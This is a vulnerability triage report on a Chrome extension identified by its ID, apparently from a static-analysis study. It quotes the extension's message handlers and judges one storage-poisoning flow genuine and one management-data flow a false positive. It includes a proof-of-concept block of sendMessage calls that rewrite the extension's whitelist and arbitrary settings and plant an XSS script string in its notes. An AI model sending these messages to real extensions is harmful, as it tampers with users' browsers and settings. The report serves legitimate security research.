# CoCo Analysis: micenhpgfbblcpiagoofjlnojdfjbohd

## Summary

- **Overall Assessment:** TRUE POSITIVE (1 TRUE POSITIVE, 1 FALSE POSITIVE)
- **Total Sinks Detected:** 2 distinct flows (multiple localStorage writes from same source counted as one flow)

---

## Sink 1: bg_chrome_runtime_MessageExternal → bg_localStorage_setItem_value_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/micenhpgfbblcpiagoofjlnojdfjbohd/opgen_generated_files/bg.js
Line 1953     if (e.set_wl) {
    e.set_wl

Line 1957         if (o[r].id === e.set_wl.id) {
    e.set_wl.id

Line 1964       localStorage.setItem("had_wl", JSON.stringify(o));
    JSON.stringify(o)

[Additional flows at Lines 1967, 1970-1972, 1982-1983 with similar pattern]
```

**Code:**

```javascript
// Background script (bg.js) - Lines 2004-2027
chrome.runtime.onMessageExternal.addListener(function(t, a, o) {
    if (e.debug) console.log("exMsg:", t, a);
    var l = false;
    if (e.defaultWhitelistApps.indexOf(utils.getHash(a.id))) {
      l = true
    } else {
      var r = JSON.parse(localStorage.getItem("had_wl"));
      for (var n of r) {
        if (n.id === a.id) {
          l = true;
          break
        }
      }
    }
    if (!l) {
      chrome.management.get(a.id, function(e) {
        if (e.permissions && e.permissions.indexOf("newTabPageOverride") > -1 && e.permissions.indexOf("unlimitedStorage") > -1 && e.permissions.indexOf("topSites") > -1 && e.permissions.indexOf("management") > -1) {
          if (e.hostPermissions && (e.hostPermissions.indexOf("https://*.kissappsl.com/*") > -1 || e.hostPermissions.indexOf("https://*.kissappsl.com/*") > -1)) {
            return E(t, a, o) // ← calls E with external message data
          }
        }
      })
    } else E(t, a, o) // ← calls E with external message data
});

// Function E (Lines 1952-2000) - Processes external messages
function E(e, t, a) {
    if (e.set_wl) { // ← attacker-controlled
      var o = JSON.parse(localStorage.getItem("had_wl")) || [];
      var l = false;
      for (var r = 0; r < o.length; r++) {
        if (o[r].id === e.set_wl.id) { // ← attacker-controlled
          o[r] = e.set_wl;
          l = true;
          break
        }
      }
      if (!l) o.push(e.set_wl);
      localStorage.setItem("had_wl", JSON.stringify(o)); // ← storage poisoning
      if (typeof a === "function") a(chrome.runtime.id + " OK")
    }
    if (e.changeOptions) { // ← attacker-controlled
      R(e); // ← calls R function
      if (typeof a === "function") a(chrome.runtime.id + " OK")
    } else if (e.syncNote) { // ← attacker-controlled
      localStorage.setItem("notes", e.syncNote.notes); // ← storage poisoning
      localStorage.setItem("enable_note", e.syncNote.enabled); // ← storage poisoning
      // ... additional code
    } else if (e.updateNote) { // ← attacker-controlled
      localStorage.setItem("notes", e.updateNote.notes); // ← storage poisoning
      // ... additional code
    }
}

// Function R (Lines 1890-1925) - Processes changeOptions
function R(t) {
    // ... filtering code ...
    if (t.changeOptions.enable_most_visited) localStorage.setItem("enable_most_visited", t.changeOptions.enable_most_visited); // ← storage poisoning
    else if (t.changeOptions.disable_most_visited) localStorage.setItem("enable_most_visited", t.changeOptions.disable_most_visited == "yes" ? "no" : "yes");
    if (t.changeOptions.enable_apps) localStorage.setItem("enable_apps", t.changeOptions.enable_apps); // ← storage poisoning
    else if (t.changeOptions.disable_apps) localStorage.setItem("enable_apps", t.changeOptions.disable_apps == "yes" ? "no" : "yes");
    if (t.changeOptions.enable_share) localStorage.setItem("enable_share", t.changeOptions.enable_share); // ← storage poisoning
    else if (t.changeOptions.disable_share) localStorage.setItem("enable_share", t.changeOptions.disable_share == "yes" ? "no" : "yes");
    if (t.changeOptions.enable_todo) localStorage.setItem("enable_todo", t.changeOptions.enable_todo); // ← storage poisoning
    else if (t.changeOptions.disable_todo) localStorage.setItem("enable_todo", t.changeOptions.disable_todo == "yes" ? "no" : "yes");
    for (let e of Object.getOwnPropertyNames(t.changeOptions)) {
      if (t.changeOptions[e] !== null) {
        localStorage.setItem(e, t.changeOptions[e]) // ← generic storage poisoning
      }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - External extensions/apps can send messages

**Attack:**

```javascript
// Malicious extension with appropriate permissions can send message
chrome.runtime.sendMessage(
  "micenhpgfbblcpiagoofjlnojdfjbohd", // target extension ID
  {
    set_wl: {
      id: "malicious_id_here",
      name: "Malicious App",
      // Any other malicious data
    }
  },
  function(response) {
    console.log("Storage poisoned:", response);
  }
);

// Or poison settings/options
chrome.runtime.sendMessage(
  "micenhpgfbblcpiagoofjlnojdfjbohd",
  {
    changeOptions: {
      enable_most_visited: "malicious_value",
      enable_apps: "no",
      enable_share: "no",
      custom_key: "custom_malicious_value"
      // Can set ANY localStorage key via the generic loop
    }
  }
);

// Or poison notes
chrome.runtime.sendMessage(
  "micenhpgfbblcpiagoofjlnojdfjbohd",
  {
    syncNote: {
      notes: "<script>alert('XSS')</script>",
      enabled: "yes"
    }
  }
);
```

**Impact:** Multiple storage poisoning vulnerabilities. External extensions or apps can send messages via `chrome.runtime.onMessageExternal` to poison the extension's localStorage with arbitrary data. The vulnerability allows attackers to:

1. **Whitelist manipulation**: Add malicious entries to the "had_wl" whitelist
2. **Settings poisoning**: Modify extension settings (enable_most_visited, enable_apps, enable_share, enable_todo, etc.)
3. **Generic storage poisoning**: The generic loop at lines 1921-1925 allows writing ANY key-value pair to localStorage via `t.changeOptions[key]`
4. **Notes poisoning**: Inject malicious content into stored notes that may be rendered in the extension's UI

While there are some permission checks, per the methodology we ignore manifest restrictions. Even if only specific extensions can exploit this, it's still a TRUE POSITIVE.

---

## Sink 2: management_getAll_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/micenhpgfbblcpiagoofjlnojdfjbohd/opgen_generated_files/bg.js
Line 920     var ExtensionInfos = [...]
[CoCo only detected framework code]
```

**Code:**

```javascript
// Background script (bg.js) - Lines 2028, 2087-2091
chrome.runtime.onMessage.addListener(function(t, a, o) { // ← Internal messages, NOT external
    // ... other handlers ...
    if (t.appGetAll) {
      chrome.management.getAll(function(e) {
        o(e) // ← sends management data back
      });
      return true
    }
});
```

**Classification:** FALSE POSITIVE

**Reason:** The flow from `chrome.management.getAll()` to `sendResponse()` is triggered by `chrome.runtime.onMessage.addListener` (line 2028), which handles INTERNAL messages from the extension's own content scripts, NOT external messages from malicious extensions or websites. This is not accessible to external attackers. The extension is simply providing its own content script with information about installed extensions, which is legitimate internal functionality. No external attacker trigger exists for this flow.
